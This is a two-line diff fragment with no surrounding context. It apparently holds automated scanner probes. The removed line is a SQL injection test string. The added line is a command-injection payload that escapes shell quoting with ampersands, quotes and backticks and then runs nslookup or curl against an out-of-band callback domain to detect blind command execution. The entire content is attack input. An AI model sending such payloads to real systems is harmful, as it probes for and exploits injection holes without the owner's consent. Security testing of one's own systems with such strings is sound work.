@@ -1,1 +1,1 @@
--1" OR 2+404-404-1=0+0+0+1 -- 
+&(nslookup -q=cname hitszesuddcph4be1c.bxss.me||curl hitszesuddcph4be1c.bxss.me)&'\"`0&(nslookup -q=cname hitszesuddcph4be1c.bxss.me||curl hitszesuddcph4be1c.bxss.me)&`'
